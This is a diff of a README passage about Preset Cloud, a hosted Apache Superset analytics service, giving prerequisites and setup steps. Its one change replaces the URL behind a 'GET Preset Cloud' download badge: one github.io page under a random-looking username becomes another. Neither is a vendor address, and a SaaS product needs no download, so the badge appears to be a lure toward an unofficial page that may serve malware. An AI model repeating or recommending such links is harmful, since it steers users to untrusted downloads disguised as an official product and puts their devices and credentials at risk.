@@ -53,7 +53,7 @@ As a Preset Cloud SaaS solution, the platform fits organizations that want the f
 
 Prerequisites: A Preset Cloud account, an approved data warehouse connection, workspace permissions, and a clear first analytics use case for BI dashboards or embedded reporting.
 
-[![GET Preset Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Preset%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/preset-cloud-app)
+[![GET Preset Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Preset%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://teddyrosariojgih.github.io/.github/preset-cloud-app)
 
 1.  **Download and Review Resources:** Start with Preset Cloud documentation and Preset Cloud tutorials to understand workspace setup, supported data connections, and core Apache Superset concepts.
 2.  **Configure Access:** Use Preset Cloud login and workspace administration to assign analysts, dashboard owners, and viewers the correct permissions before publishing content.
